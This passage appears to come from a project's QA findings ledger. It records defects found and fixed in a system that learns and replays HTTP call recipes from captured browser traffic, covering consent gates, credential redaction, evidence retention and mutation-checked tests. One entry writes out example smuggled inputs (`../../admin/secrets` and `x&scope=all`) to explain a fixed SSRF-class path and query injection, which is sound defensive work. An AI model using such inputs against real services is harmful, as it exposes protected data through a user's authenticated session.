- **`p2-recut-acceptance-substituted-a-different-execution-model`** (CLOSED 2026-08-19, HIGH,
  unfalsifiable headline claim). The acceptance fixture's stand-in daemon resolved header values from
  a map it simply held, while the real daemon resolved them from a recorder a replay lease did not
  have. Its headline assertion - "the replay reached the real API carrying the session header" - was
  therefore true of the fixture and FALSE of production, and no mutation of the daemon could have
  turned it red. `api/**` may not import `clients/**` (lint-enforced zone), so this suite
  structurally CANNOT exercise the daemon; the previous cut did not say so. Closed by splitting the
  claim and saying which half lives where, in the suite header: the hosted half is asserted here
  (zero model calls at the chokepoint, no new run record, and the FRAMES Cortex emits carrying the
  learned header names), the daemon half in the two real-browser bridge suites named above. The
  stand-in was additionally rewritten to model the real contract - it starts holding NO header
  values, learns them only from traffic it observes, and refuses a call for an origin it was never
  navigated to - so it can no longer flatter the hosted side. Falsifiability re-derived by mutation:
  dropping `headerNames` in `runInPage` turns three acceptance cases red.

- **`p2-recut-mutates-false-action-bricked-by-a-learned-post`** (CLOSED 2026-08-19, HIGH, no recovery
  path). A `mutates: false` action whose learned recipe contained a POST ended `awaiting_consent`
  forever. At the automation seam `writeAssent` is `false` ONLY for an action declared
  `mutates: false` (the executor refuses an unapproved write before the seam), and such an action is
  never put to a human at all - `checkActionConsent` answers `not_mutating` and there is no approval
  flow to enter. So the error named a consent nobody could give, and `putRecipe` refuses to overwrite
  while `supersedeRecipe` only bumps: every later run failed on the same gate with no control its
  owner could touch. A read-declared action learning a POST is ORDINARY - portals serve searches over
  POST - so the RECIPE is what gives way, not the action. Closed by clearing the offending recipe
  (`IntegrationRecipeStore.clearRecipe`, new) and falling through to the authored automation, which
  is what the human approved in the first place. Pinned in `tests/automation/replay-mount.test.ts`,
  including the case where the clear itself fails.

- **`p2-recut-action-assent-authorised-an-unseen-call-set`** (CLOSED 2026-08-19, MAJOR, consent did
  not cover what was shown). The write gate's key was the owner's approval of an ACTION, and it was
  used to authorise an arbitrary per-CALL set compiled afterwards from traffic nobody looked at;
  `healDriftedRecipe` additionally INHERITED that answer while re-authoring the call set. Approving
  "send_message may write" is not approving "issue these four POSTs to these four URLs". Closed on
  both sides: `learnFromRun` refuses to STORE any recipe containing a write by either route, and the
  heal no longer receives `writeAssent` at all, so a re-authored write set is never live. This slice
  has no surface that shows a human a compiled call set, and that is stated rather than papered over
  with a field nobody sets.

- **`p2-recut-raw-capture-evidence-accumulated-forever`** (CLOSED 2026-08-19, MAJOR, unbounded growth
  of the most sensitive data in the pipeline). The design is capture -> learn -> compile -> DISCARD,
  and `discardCapture` had no production caller: every learn wrote a new `captureId` and none was
  ever removed, so a recurring action piled up full request/response bodies indefinitely. Closed by
  discarding the evidence behind the recipe a write REPLACES, once the new recipe is live - the
  current recipe's own evidence stays, which is what `capturedCallsRef` is for. Best effort and loud:
  a leaked capture is untidy, losing the evidence for a recipe that failed to store is worse.

- **`p2-recut-posture-never-consulted-with-a-browser-session`** (CLOSED 2026-08-19, MINOR).
  `chooseRoute` returned `in-page` before asking `classify`, so a replay holding a browser session
  resolved no posture at all and the run record could not say what the system believed about the
  hosts it had spoken to. Closed by resolving posture for every call on every rung and recording it
  on `InjectedCallResolved.posture`. NOTE what was deliberately NOT changed, because the code and the
  finding disagree here and the code is right: the in-page rung stays non-refusable by posture. It is
  the rung an adversarial origin REQUIRES, and gating it would disable the ladder exactly where it is
  the only thing that works, and would break the multi-origin recipes the design explicitly supports.
  What bounds that rung is provenance, not posture - every origin in a recipe was compiled from
  traffic the site's own page generated, the store refuses a recipe carrying a value, and `fillCall`
  refuses an argument that moves the host. That reasoning now sits at the decision point in code.

- **`p2-recut-global-definition-org-can-never-learn-silently`** (CLOSED 2026-08-19, MINOR). A recipe
  is written onto the org's OWN definition row, so an org running an action off a published/`global`
  definition has no row to write to and `putRecipe` answered `notfound`, which nothing read. The
  limitation is correct - one tenant's learning must not land on a row every org reads - but a learn
  that vanishes without a word is indistinguishable from a broken one. Closed by naming it in the log
  at the point the verdict comes back.

- **`p2-recut-unfailable-assertions-re-derived-by-mutation`** (CLOSED 2026-08-19, MINOR, test
  quality). Five assertions were re-derived by mutating what they claim to protect. Two isolation
  positives used `expect(outcome).not.toBe('unavailable')`, which any unrelated outcome satisfies:
  under a mutation making the stored recipe unreadable, the single-origin control stayed GREEN (3 red
  with the old form vs 4 with the new). Both now assert the outcome and reason precisely, pinning
  that the server-side rung was actually TAKEN. The write-assent cases asserted only what a function
  was handed; they are joined by two that assert the CONSEQUENCE at the gate itself. The fake-page
  inject suite's header now states plainly that it is evidence about the composed script and the
  parsed envelope and about NOTHING else - no fetch ever happens on that page - and points at the
  real-browser suite for anything concerning what the replay carries.

- **`p2-r4-mutating-action-learns-a-read-only-recipe-and-reports-success`** (CLOSED 2026-08-19,
  BLOCKER, silent non-performance). A `mutates` action's discovery pass captures the READS its page
  made; the write itself is typically a form post, a non-JSON response, or a login-shaped body the
  compile drops. `writesIn` found no write in the compiled set, so the recipe was stored - and every
  later run replayed the reads, answered `ok`, and reported SUCCESS while the action's whole purpose
  went unperformed. Nobody discovers it until somebody checks the far system. Closed on both sides:
  `learnFromRun` refuses to store a recipe that does not cover the action's declared effect, and
  `replayCompiledAction` answers `does-not-cover` for one it finds, which the mount clears and falls
  through on - loudly - to the authored steps that DO write. `IntegrationAction.mutates` is carried
  across the automation seam for this; it is a different fact from `writeAssent` and is read off the
  resolved action rather than inferred from the consent verdict beside it. Proved at
  `executeUserIntegrationAction` (`discovery-replay-acceptance.test.ts`) against two actions on the
  SAME automation and the SAME captured traffic that differ in exactly one declared fact.

- **`p2-r4-replayed-path-and-query-were-caller-controlled`** (CLOSED 2026-08-19, MAJOR, SSRF-class
  with the user's live session attached). `fillCall` rendered the whole URL template with
  `interpolate` and then compared origins, so an argument could change the endpoint while keeping the
  host: `…/cases/{{input.id}}` with `id=../../admin/secrets` resolved to `…/admin/secrets`, and
  `?ref={{input.ref}}` with `ref=x&scope=all` added a parameter. The in-page rung means these run
  inside the authenticated page. Closed by templating and filling COMPONENT-WISE: the compile never
  puts a hole in an origin or a parameter name, the fill percent-encodes every value, and the result
  is proved against a control render (`structureOf`). Eight escape attempts are pinned in
  `injected-call-replay.test.ts`.

- **`p2-r4-url-template-path-holes-were-silently-percent-encoded`** (CLOSED 2026-08-19, MAJOR, found
  while fixing the above). `{` and `}` are in the WHATWG path percent-encode set, so parsing a
  template with `new URL` turned every PATH hole into `%7B%7B…%7D%7D` - unfillable, and sent to the
  site as a literal. Query holes survive, and the compile's commonest output is a query hole, which
  is why no suite saw it. Closed by splitting the template by grammar and handing only real-URL
  pieces to the parser.

- **`p2-r4-an-unlocatable-argument-compiled-to-a-constant-recipe`** (CLOSED 2026-08-19, MAJOR, silent
  wrong answer). An input that appeared nowhere in the captured URL or body got no hole, so the
  compiled call was a constant and every later run returned the first run's data regardless of what
  the caller asked. Closed by refusing the compile, with the reason logged. A non-scalar argument
  refuses too: there is no verbatim form of it to have located, so the compile cannot claim it was
  honoured.

- **`p2-r4-capture-evidence-orphaned-when-the-recipe-write-did-not-land`** (CLOSED 2026-08-19,
  MAJOR, unbounded growth of the most sensitive data in the pipeline). Evidence must be written
  before the recipe (the recipe points INTO it), and nothing collected it when the write did not
  land - which is the COMMON case, since `putRecipe` refuses to overwrite by design. Closed by
  discarding the just-written evidence when the write did not land, sharing one `discardEvidence`
  helper with the supersede path. NOTE where this ledger and the code disagreed and the CODE WON: the
  round-two claim that `discardCapture` "still has no production caller" was already stale -
  `learnFromRun`'s supersede discard is a production caller and is reachable through the heal path.
  What was true is that the orphan on the failed-write side had none, and that is what is closed.

- **`p2-r4-three-secret-registry-hops-were-surviving-mutants`** (CLOSED 2026-08-19, MAJOR, a check
  that reads as covered). Deleting the registry from any of three hops - `replayIntegrationAction` ->
  `replayCompiledAction`, `learnFromRun` -> `persistEvidence`, `learnFromRun` -> `putRecipe` - left
  every suite green, because the suites asserted the registry was HANDED OVER and never that a value
  was REFUSED because of it. Closed with consequence assertions against real stores and the real
  mount (`replay-mount.test.ts`, "the run's live credential values reach every check that takes
  them"), each verified by deleting the line and watching a test go red. The evidence/recipe case
  uses a live value wearing a header NAME: names are never redacted and a low-entropy credential is a
  valid RFC 7230 token, so both shape rules pass it and only the registry can refuse - which is
  precisely the case both stores' registry legs are documented to exist for.

- **`p2-r4-four-unfailable-tests`** (CLOSED 2026-08-19, MINOR, test quality). Re-derived by mutating
  each safety-critical assertion. (1) `replay-mount.test.ts` "hands the replay a registry built from
  THIS run's credential values" asserted a function was CALLED with something - the next hop could be
  deleted freely; replaced by the consequence (the machine was never asked to make the call), with a
  control proving the same harness does send one for an ordinary argument. (2)
  `discovery-replay-acceptance.test.ts` "keeps no value in it either" was a same-file fixture
  tautology: the integration is `authType: 'none'`, so the run holds no credential and the fixture
  emits header names by contract - nothing could ever have appeared. Reframed to state what it pins
  (the wire contract) and to point at where redaction is actually proved. (3)
  `integration-write-gate.test.ts` "an approved write does NOT authorise a learned call set - the
  recipe is refused" only called `writesIn` on a literal built in the same file; removing the learn's
  refusal left it green. It now drives the real learn through a real approval and asserts nothing was
  stored. (4) `injected-call-replay.test.ts` reached the node-http rung only with an injected
  `fetchImpl`, so `guardedFetch` - the SSRF guard the module names - was never executed; swapping it
  for a bare `fetch` left every suite green. A case with NO injected transport now proves a
  link-local address is refused, with a control proving an ordinary address goes through the same
  transport.

- **`p2-r4-query-name-clause-of-the-structural-proof-has-no-failing-case`** (DISMISSED 2026-08-19,
  MINOR, written dismissal per the QA process). `structureOf` compares the filled URL's query
  parameter NAMES against the control's. That clause cannot currently be made to fire: a hole in a
  parameter name is refused at parse time, and every filled value is percent-encoded, so neither `&`
  nor `=` can reach the query as a separator. Mutating it away therefore leaves the suites green.
  KEPT DELIBERATELY, and recorded here rather than left to read as covered: it states the whole of
  what a filled value must not change, and it is the clause that would catch a future weakening of
  the encoding - which is the only thing standing in front of it. The path clauses of the same proof
  ARE independently falsifiable (`..` needs no character an encoder escapes) and are pinned.

- **`p2-r5-an-argument-with-no-hole-was-ignored-at-replay`** (CLOSED 2026-08-19, MAJOR, silent wrong
  answer). The compile refuses to LEARN a recipe that ignores one of its arguments
  (`p2` "an argument the pass could not find refuses the compile"), and the replay refused nothing:
  an argument for which no template had a hole was simply dropped. A recipe compiled around
  `?ref=2024-1` therefore answered every later caller with the 2024-1 data, `outcome: 'ok'`, run
  reported SUCCESS - reachable from a recipe an older build stored, from a caller that starts
  passing a new argument, and from an action re-declared with a wider argument set. Closed by
  `assertEveryArgumentHasAHole` (`automation/executors/injected-call.ts`), the mirror of
  `assertHolesSupplied`: together they prove the recipe's holes and the run's arguments are the SAME
  SET. The refusal is a fall-through (`no-recipe`), exactly as its mirror is - the authored steps DO
  see every argument, so refusing the replay costs the optimisation and never the answer. The two
  exemptions are the compile's own and are read through the same `SECRET_SHAPED_INPUT_NAME`
  vocabulary, so the two sides cannot disagree; a NON-SCALAR argument is refused rather than
  exempted (the compile refuses it too, and a hole bearing its name would send `[object Object]`).
  Pinned at the unit level by seven cases - three refusals asserting that NOTHING was sent, and four
  controls (the same recipe minus the offending argument; an argument honoured by the second call of
  two; a hole in the BODY; a secret-shaped and a null name) asserting the exact call that WAS - and
  in the acceptance against the real fixture server, whose control sits in the same test.

- **`p2-r5-mutates-was-read-as-eq-true-against-the-repo-fail-closed-rule`** (CLOSED 2026-08-19,
  MAJOR, fail-open reading of an unvalidated field). `action-consent.ts` states the repo's one
  reading of `mutates` and enforces it in `actionRequiresConsent`: ONLY A LITERAL `false` IS A READ,
  because the field arrives off a `config.json` that is parsed rather than schema-validated and off
  Mongo rows an agent authored. The spine read the same field with `=== true` in three places - the
  executor's seam mapping (`action-executor.ts`), the learn (`service.ts`) and the replay's coverage
  refusal (`injected-call.ts`) - which inverts the rule for exactly the values that arrive
  unvalidated (absent, `"false"`, `0`, `null`). Consequence: an action that really writes, whose
  `mutates` never arrived, stored the reads its pass happened to see and every later run replayed
  them and reported success while nothing was submitted - the read-learns-a-write hole re-opened from
  the other side. Closed by (a) reading the field through `actionRequiresConsent` at the executor, so
  there is ONE predicate rather than a restatement of it, (b) normalising once, fail-closed, at the
  top of `runAutomationForAction`, and (c) making `mutates` a REQUIRED boolean on `ReplayActionInput`
  and `ReplayInput`, so a caller that forgets is a compile error rather than a silently mutating
  action. Pinned by consequence in `tests/security/integration-write-gate.test.ts` (an action with
  the field ABSENT stores nothing and arms nothing; the same action with a literal `false` does
  both), verified by restoring `=== true` and watching it go red. SWEPT: `platform-call.ts` already
  calls `actionRequiresConsent`; `automation/manifest-parser.ts:133` reads `cap.mutates === true` on
  an ARTIFACT MANIFEST capability, which is a different field on a different type with no consumer
  anywhere in the repo and no gate behind it - recorded here as swept, deliberately not changed.

- **`p2-r5-the-recorder-was-armed-for-runs-that-could-never-store-a-recipe`** (CLOSED 2026-08-19,
  MAJOR, credential exposure for no benefit). A mutating action stores no recipe at all in this
  slice, by two refusals that are one rule read from both sides. The learning pass was nevertheless
  armed for it: `observeNetwork` was gated on the action merely being NAMED, so the machine's
  `NetworkRecorder` was created and attached, and while armed it holds the live VALUE of every
  header the authenticated page sends (`clients/bridge/src/browser/capture.ts`, the `live` map). A
  full pass's request and response bodies were then shipped across the wire, redacted twice and
  compiled - to reach a refusal that was decidable before the run began. Closed by deciding
  storability BEFORE the engine is called (`storable` in `runAutomationForAction`), which is also
  where the fail-closed `mutates` read now lives; the replay is still TRIED for a mutating action
  (`named`, not `storable`) so an older build's recipe is still seen and cleared. The duplicate
  `input.mutates` check inside `learnFromRun` was REMOVED rather than left as a second line: nothing
  calls that function for a mutating action any more, and an unreachable gate is one a reviewer
  trusts and a mutation test cannot kill. Pinned in the acceptance ("never arms the machine's
  recorder for the WRITE action, and does for the READ"), asserted on the capture ops the MACHINE was
  sent, with the read action as the control in the same test.

- **`p2-r5-three-unfailable-tests`** (CLOSED 2026-08-19, MINOR, test quality). Re-derived by mutating
  each safety-critical assertion. (1) `self-heal.test.ts` "forwards the run registry so the store can
  refuse a recipe carrying a live value" asserts the registry was passed to a FAKE `supersedeRecipe`
  that answers a canned success, so the real store could ignore `opts.secrets` on the supersede path
  entirely and every suite stayed green - the sibling route (`putRecipe`) WAS pinned against the real
  store, the supersede route was not. Closed by a real-store supersede case with a live value and its
  own control (`replay-mount.test.ts`, "…including on the SUPERSEDE route"), verified by dropping
  `opts.secrets` from the store's supersede and watching it go red. (2)
  `injected-call-replay.test.ts` "refuses to send a resolved URL that contains a live credential
  value" pinned one of `assertNoCredentialRodeIn`'s two legs; deleting the BODY leg left the whole
  automation and security lane green, so the leg guarding a POST recipe was covered by nothing.
  Closed with a body-template case and its control. (3)
  `discovery-replay-acceptance.test.ts` "the daemon really was asked to record" asserted
  `daemon.armed || daemon.leaseReleased`, and `leaseReleased` is set on every run - the disjunction
  was identically true and no mutation could falsify it. Proved by neutering `startCapture` and
  watching that line PASS while a later one failed. Closed by asserting the capture-op LOG, which is
  also what the new arming case above is keyed on.

- **`p2-r5-captured-bodies-were-name-redacted-twice`** (CLOSED 2026-08-19, MINOR, redundant work on
  the capture-persist path). `redactCaptures` wrapped `redactStream(raw, secrets)` in a second
  `redactBodyByName`, but `redactStream` IS that pair (registry leg, then name leg). The transform is
  idempotent so nothing was wrong in effect, but every captured body was parsed and re-serialised
  twice on the one path `redactBodyByName`'s own performance note is about, and the doubling made one
  leg read as two independent ones - which is how it survived: either copy alone kept the suites
  green, so neither could be shown to matter. Closed by removing the wrap and pinning the leg for
  BOTH bodies (`network-capture.test.ts`), verified by deleting the name pass inside `redactStream`
  and watching the two new cases go red.

- **`p2-replayed-action-answers-a-different-envelope`** (CLOSED 2026-08-20, CRITICAL, silent data
  loss on the listener rail). `runAutomationForAction` answered `{replayed, recipeVersion, output}`
  on the replay short-circuit and `{runId, status, summary, output}` on the automation path. Every
  consumer is written against the second: `user-defined-poll.ts` `pollBody` unwraps `output` ONLY
  when it sees both a string `runId` and a string `status`, so a replayed poll resolved the
  package's `listenerConfig` paths against the ENVELOPE, read `undefined` from `cursorField` and
  `eventArrayField`, and reported a quiet provider. Permanently, and with no way out: the replay
  keeps SUCCEEDING so no drift ever fires, `putRecipe` refuses to overwrite, and nothing clears a
  recipe that works. `pollBody`'s own docblock names this as "the silent-empty failure mode this
  module exists to avoid". Closed by ONE envelope constructor used by both legs
  (`ActionRunEnvelope`), with the replay's `runId` being the `replay-…` id its browser lease and its
  daemon frames are already ledgered under - so it names a real execution rather than an
  `automationRuns` document that does not exist. Proved at three levels (the mount's whole-shape
  `toEqual`, the acceptance's key-set comparison of the two legs, and a REPLAYED listener tick
  through the real handler in `user-defined-poll.test.ts`), each verified by restoring the old
  envelope and watching it go red.

  QUALIFICATION, because the code disagrees with the shape of the report: for the SHIPPED citius
  listener the observable difference is nil, and not because the defect was not real. Its automation
  template (`api/assets/integrations/citius/automations/notificacoes.json`) is browser + verify steps
  only, and `extractActionRunOutput` reads the last `api_call`/`ekoa_action` step - of which there
  are none - so `consultar_notificacoes` answers `output: undefined` on the AUTOMATION path too, and
  its listener stalls identically with no replay in sight. See the finding below; the envelope defect
  bites any automation-backed action whose automation actually produces an output, which is every
  user-authored one that ends in an api_call or an ekoa_action step.

- **`citius-notificacoes-automation-produces-no-output`** (OPEN 2026-08-20, HIGH, shipped package).
  `StepOutput` exists for exactly three step types (`local_command`, `api_call`, `ekoa_action`) and
  `extractActionRunOutput` reads two of them. The shipped citius `notificacoes` template ends in a
  `verify` step, so the action's answer is `undefined` whatever the run did - while the package's
  `listenerConfig` reads `notificacoes` and `highWater` off it. The listener therefore delivers
  nothing today, on both paths, and P2 neither caused that nor fixes it: the spine's job is to make
  the replay answer WHAT THE RUN ANSWERED, which it now does exactly (`answersWith` absent ⇒ the
  replay answers nothing either). NOT closed here because the fix is a package change - the template
  needs a step that produces the structured list - and it belongs with whoever owns the citius
  package and can check the answer against the real portal.

- **`p2-replay-answered-with-an-arbitrary-captured-call`** (CLOSED 2026-08-20, CRITICAL, silent
  wrong answer). `replayCompiledAction` returned `data: calls[calls.length - 1]?.body`, where `calls`
  is in compile order = the machine's `page.on('response')` COMPLETION order. Nothing correlated that
  with the action's own output. Reproduced: adding one ordinary internal call to the fixture page - a
  notification-badge GET issued after the search - made run 2 answer `{"unread":7}` with
  `success: true, replayed: true`. So once an action learns, its answer silently becomes whichever
  captured call happened to finish last. `MAX_COMPILED_CALLS = 24` says multi-call recipes are
  expected; the acceptance fixture emitted exactly one call per frame, so it structurally could not
  see this, and it never asserted that run 2's answer equalled run 1's. Closed by correlating at
  COMPILE time against the learning run's own output and writing the result into the recipe
  (`answersWith: {callIndex, matchedBy: 'run-output-identity'}`, range-checked at parse and refused
  at the store if it does not index a call): identity over canonical JSON, absent when the run
  answered nothing, and a REFUSAL TO LEARN when the run answered something no captured call
  produced - because such a recipe could only ever answer with a different call's body. The
  acceptance now asserts run 2's answer equals run 1's, and has the badge case; both verified by
  restoring `calls[calls.length - 1]`.

- **`p2-composition-root-binding-was-a-surviving-mutant`** (CLOSED 2026-08-20, CRITICAL,
  dead-in-production). `server.ts`'s `const runAutomationBackedAction: AutomationBackedHandler =
  automationBackedActionHandler();` is the ONLY production line pointing at this slice. Replacing it
  with the pre-P2 inline mapping - which type-checks, and drops `integrationKey`, `actionName`,
  `writeAssent` and `mutates` - leaves `named` false on every call, so nothing is ever replayed or
  learned, and the whole lane stayed green: the acceptance constructs the handler ITSELF (pinning the
  MAPPING, not the BINDING) and the only other guard greps `server.ts` for the identifier, which a
  rebinding of that identifier satisfies. Closed the way P4 closed its own two surviving bindings:
  `automation/composition-root-action-seam.test.ts` boots the REAL `buildApp` with the seams reset
  and enters at the bound `executeIntegrationAction`, asserting consequences (a stored recipe
  replays; an approved write's gate opens; the unapproved control refuses). Verified by applying the
  exact rebinding: 2 of its 3 cases go red while the acceptance and the poll suite stay green. The
  text guard is kept - it covers a SECOND call site (the listener's dep bundle, private to the
  composition root and unreachable from a test) - and its docblock now says what it cannot catch.

- **`p2-hosted-capture-had-no-ceiling-at-any-hop`** (CLOSED 2026-08-20, MEDIUM, resource).
  `clients/bridge/src/browser/capture.ts` bounds itself (400 exchanges FIFO, 64KB bodies) under the
  note that "an unbounded recorder attached to a long headed session is a memory leak on somebody's
  laptop". The hosted mirror bounded nothing: `DaemonBrowserSession.ingest` pushed uncapped,
  `runAutomationForAction` pushed into a second uncapped array, and `persistEvidence` wrote one Mongo
  document per exchange. A run with N browser frames on a heavy SPA therefore held N x 400 exchanges
  of up to ~128KB in the SHARED API PROCESS and wrote that many documents, while only 24 can ever
  become a recipe. Closed at all three hops: `MAX_SESSION_CAPTURED_EXCHANGES` (400, oldest dropped -
  the machine's own number and discipline, restated rather than imported because `api/` may not
  import `clients/`), `MAX_RUN_CAPTURED_EXCHANGES` (400 across the run's frames), and an evidence
  write that persists only `internalApiCalls` - the exact set a recipe can be distilled from -
  bounded at `MAX_PERSISTED_EVIDENCE` (2 x `MAX_COMPILED_CALLS`, newest kept). Each verified by
  removing the bound and watching its case go red.

- **`p2-a-narrow-recipe-owned-the-actions-only-slot-forever`** (CLOSED 2026-08-20, HIGH, silent
  permanent degradation). A listener's ESTABLISHING tick calls with `args: {}` and learns a hole-free
  recipe; every tick after it calls with `{since: cursor}`, which the replay's argument-coverage check
  correctly refuses - and the refusal was `no-recipe`, which is NOT one of the verdicts that clears a
  recipe (only `write-gate` and `does-not-cover` were). `putRecipe` refuses to overwrite and a
  supersede needs a drift that can never fire, because the replay never runs. So the action could
  never learn a usable recipe again, silently, for the life of the row - and paid for a doomed replay
  attempt on every run. Closed with a distinct outcome, `arguments-uncovered`, which CLEARS the
  recipe exactly as the other two refusals do, so the next ordinary pass learns one from the wider
  argument set. The NON-SCALAR half of the same check deliberately stays `no-recipe`: an object
  argument is a fact about the CALL (no recipe can carry one, and re-learning would refuse
  identically), so dropping the recipe over it would cost the action its optimisation for a caller's
  mistake. Verified by removing the clear and watching the acceptance's settle-and-relearn case fail.

- **`p2-r6-three-more-unfailable-tests`** (CLOSED 2026-08-20, HIGH, test quality). (1)
  `user-defined-poll.test.ts` "resolves the listenerConfig paths against the run OUTPUT, not the
  envelope" - the one test named for that exact property - built its seam's answer from a HARDCODED
  `{runId:'run-1', status:'completed', summary:'ok', output}` literal, so it was reading back the
  constant beside it and could not observe the replay envelope that breaks the property. Closed by
  driving the REAL `automationBackedActionHandler` on both legs (the automation leg over a real
  automation row and a real run record whose step output is typed as the engine's own `StepOutput`;
  the replay leg through the handler's declared `replay` dep, typed as the real `ReplayResult`), and
  by adding the replayed tick as its own case. (2) the composition-root text guard - see the binding
  finding above. (3) `service.ts` `const mutating = input.mutates !== false;` was an EQUIVALENT
  MUTANT: `=== true` left 564 tests green, because the only shipped caller normalises through
  `actionRequiresConsent` and always passes a boolean. Closed by pinning the ABSENT case at the seam
  whose type explicitly permits it (Rule 7), asserting both consequences - the replay is told the
  action writes, and no recorder is armed - and by saying plainly in the test that no shipped caller
  omits the field today, so what is pinned is the OPTIONAL FIELD'S CONTRACT and not a live production
  path. Verified with the `=== true` inversion.

- **`p2-r6-two-acceptance-cases-tested-a-rule-they-did-not-name`** (CLOSED 2026-08-20, MEDIUM, test
  quality). Making the argument-coverage refusal its own outcome exposed three cases whose stated
  subject was masked by it firing first: `injected-call-replay.test.ts` "answers no-recipe when a
  template does not resolve to an absolute URL" and "REFUSES a placeholder family the compile never
  emits" both passed their default `{ref}` argument to a recipe with no hole for it, and the
  acceptance's "a MISSING argument refuses the replay" passed `{unrelated:'x'}` - so all three were
  green on the coverage rule while claiming to test another. Each now passes the argument set that
  reaches the refusal it is named for, with a comment saying why.

- **`p2-a-recipes-answer-could-be-constant-with-respect-to-its-argument`** (CLOSED 2026-08-20,
  HIGH, silent wrong answer). `compileInjectedCalls` refused an argument it could not locate, on the
  stated ground that "the compiled call would be a constant that returns this run's data for every
  later caller" - but it checked `placed`, a UNION over every compiled call, while `answerCallIndex`
  names ONE, and the two were never compared. `answerOf` returns exactly that call's body and nothing
  chains one replayed call into the next (every template is filled from the run's arguments alone),
  so an argument absent from the answer-bearing call cannot change what the action returns.
  THE REACHABLE SHAPE, and it is ordinary: a page fetches `GET /api/cases?ref=2024-1` and a
  `GET /api/summary` serving the same document (a default view, a dashboard, a one-off page state).
  The learning run's answer identity-matches BOTH, so the compile's LAST-MATCH-WINS tie-break named
  the summary - which carries no hole at all - while `ref` was placed by call 0, so nothing refused.
  Replay with `{ref: '2025-9'}` then passed coverage (recipe-wide there too), fetched
  `?ref=2025-9` correctly on call 0, sent call 1 unchanged, and handed the caller the 2024-1 document
  under `success: true, replayed: true` - no drift (both calls still 200 with an unchanged shape),
  nothing that would ever clear it, no other symptom anywhere. Closed with one comparison at each
  end: the compile refuses unless the call at `answerCallIndex` carries every hole, and
  `argumentCoverage` runs the same check at REPLAY (as `arguments-uncovered`, so the caller clears
  it) because refusing only at compile time leaves every recipe an older build stored - which is
  every recipe this slice wrote before this round. The RECIPE-WIDE rule stays and is still right: it
  is the only rule there is when a recipe names no answer, and a per-call reading of it would refuse
  an ordinary multi-hop recipe whose opening hop takes no argument. Verified at both ends by
  restoring the union reading and watching the compile, mount, replay and acceptance cases go red.
  The tie-break's own comment claimed the choice "is only about which template is recorded, never
  about what the caller gets back"; that was the false premise, and it is corrected in place.

- **`p2-a-cleared-recipe-orphaned-its-capture-evidence-forever`** (CLOSED 2026-08-20, HIGH, unbounded
  retention of the most sensitive data this pipeline holds). The spine had twice closed the family
  "nothing durable outlives the thing it is evidence for" - the evidence behind a REPLACED recipe and
  the evidence behind one that never LANDED. `clearRecipe` is the third way a recipe can go and had
  no collector: it DID return the dropped recipe (its own comment said so - "a caller clearing a
  recipe wants to log the version it dropped") and `automation/service.ts` narrowed it to a boolean,
  so `capturedCallsRef` was never read and `discardCapture` was never called on that path. Nothing
  can reach the pile afterwards - the next learn's `priorCaptureRef` reads the CURRENT recipe, which
  is now absent - and `integration_captured_calls` has no TTL. It is routinely reachable:
  `arguments-uncovered` is the ordinary listener shape, so two callers of one action with different
  argument sets repeat the learn/clear cycle and orphan a fresh pile of full redacted request and
  response bodies every time. Closed by widening `clearRecipe` to answer with the recipe it dropped
  and putting the pairing in ONE tier-3 module, `integrations/recipe-lifecycle.ts` (`forgetRecipe`),
  which both removal paths - the run loop's refusal and the owner's new route - go through, so a
  future third path cannot forget to collect. Verified against the REAL captures collection: the
  acceptance's `arguments-uncovered` clear (real default `clearRecipe`) and the contract suite's
  DELETE both assert the documents GONE, and both redden when the store's answer is hollowed out.

- **`p2-a-wrongly-answering-recipe-was-unclearable-by-its-owner`** (CLOSED 2026-08-20, MEDIUM,
  permanent silent degradation with no operator control). `clearRecipe`'s docblock called itself "the
  escape hatch that stops a bad recipe becoming a permanent property of an action", and its only
  caller fired on the three replay outcomes that visibly REFUSE (write-gate, does-not-cover,
  arguments-uncovered). A recipe that keeps answering `ok` and answers WRONGLY - learned from a
  one-off page state, or the constant-answer shape above - reached none of them: `putRecipe` refuses
  to overwrite by design, `supersedeRecipe` needs a drift that cannot fire while the calls keep
  returning 200 with an unchanged shape, nothing expires it, and there was no route, descriptor entry
  or UI. Closed with two `auth: 'user'` endpoints - `GET /api/v1/integrations/recipes` (tenant-wide,
  a SUMMARY projection) and `DELETE /api/v1/integrations/:key/actions/:actionName/recipe` (idempotent,
  and it takes the evidence with it). DELIBERATELY NARROW, journaled in `docs/decisions.md`: not
  `user-or-key` on either, and NO dashboard surface in this slice. The list route is also what finally
  gives `recipe-store.listRecipesForActor` a caller; it had none.

- **`the-retention-window-was-a-number-no-test-could-tell-from-any-other`** (**FIXED 2026-08-20**,
  S1 round six, **MAJOR** - a load-bearing constant unpinned in the direction that destroys tenant
  data; created BY round five's simplification, not by a mistake in it). Round five removed every
  synchronous evidence collector and left TTL as the sole automatic one. That promoted
  `EVIDENCE_RETENTION_DAYS` from a backstop to the thing four documents rest their accepted-cost
  argument on - and **nothing enforced it**.

  **MEASURED**: 90 -> 1 left all thirteen S1 suites green (246/246), and since only three files in
  the 404-file estate touch `sweepExpiredEvidence` / `sweepScreenshotsSparingPinnedEvidence`, the
  wider suite went green with them. The WIDENING direction was caught (90 -> 36_500 reddens 4 across
  3 suites); the NARROWING direction was not, because the one case that could have caught it stamped
  its surviving row ONE DAY before the sweep - pinning the window to `>= 1 day` and nothing more.
  **Consequence if it had shipped**: an edit or an env-driven override narrowing the window deletes
  every tenant's evidence shortly after their last run - the owner's only copy of their own
  third-party request and response - AND releases every automation-backed row's screenshot pin in the
  same boot, so the next sweep takes the PNGs too.

  Closed by restating `90` as a LITERAL in `sweepExpiredEvidence - the retention bound`
  (`api/tests/integrations/action-evidence.test.ts`) and straddling the cutoff by HALF A DAY either
  side - whole-day offsets let a 90 -> 89 mutant survive, because that row would sit exactly on the
  new cutoff and the comparison is a strict `$lt`. Verified by mutating the source: 90 -> 89,
  90 -> 91 and 90 -> 1 each redden exactly this case; restored, `git diff` clean. The constant's own
  docblock now points at the case, so a deliberate shortening meets an explanation rather than a bare
  red.

- **`a-cap-asserted-through-its-own-import-pins-the-name-not-the-value`** (**FIXED 2026-08-20**, S1
  round six, **MINOR x2**, same class as the entry above). `MAX_EVIDENCE_STEPS` and
  `MAX_EVIDENCE_EXCERPT_CHARS` were **fully unpinned**: every case built `CONST + N` inputs and
  asserted `toHaveLength(CONST)`, which is true of every value the constant could hold. Measured:
  50 -> 7 and 8_000 -> 111 both left `action-evidence.test.ts` and `action-evidence-isolation.test.ts`
  green. Both are now literals in both suites, following the discipline
  `tests/automation/action-evidence.test.ts` already states for the collector's mirror of the same
  caps. The step case additionally asserts the FIRST steps by index, so a `slice(-MAX_EVIDENCE_STEPS)`
